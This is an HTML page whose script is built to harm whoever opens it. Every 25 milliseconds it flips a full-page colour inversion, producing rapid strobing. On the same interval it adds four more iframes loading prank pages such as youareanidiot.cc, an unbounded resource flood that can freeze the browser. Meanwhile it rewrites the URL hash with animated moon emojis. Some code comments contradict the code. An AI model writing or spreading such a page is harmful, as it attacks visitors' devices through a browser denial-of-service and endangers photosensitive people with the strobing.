<html>
<head>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <iframe src="https://hurr-durr.cc" id="searchFrame" height=12 width=12></iframe>
    <script>
        // Triggers every 200ms (0.2 seconds)
        const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
        let step = 0
            
        setInterval(function(){
            let s = ''
            // 10 is the number of moons
            for (let i = 0; i < 50; i++) {
                // This math creates a "wave" effect based on the index (i)
                // Adjusting 'step' moves the wave forward
                const phase = Math.floor(Math.sin((step / 5) - (i / 2)) * 4 + 4)
                s += f[phase % 8]
            }
    
            window.location.hash = s
            step++
        }, 70)
        setInterval(() => {
                document.body.style.filter = document.body.style.filter === 'invert(1)' ? 'invert(0)' : 'invert(1)';
        }, 25);
        setInterval(function(){
            document.body.appendChild(document.createElement("iframe")).src = "lol3.html"
            document.body.appendChild(document.createElement("iframe")).src = "https://youareanidiot.cc"
            document.body.appendChild(document.createElement("iframe")).src = "https://hurr-durr.cc"
            document.body.appendChild(document.createElement("iframe")).src = "https://lol1.html"
        }, 25);
    </script>
</html>
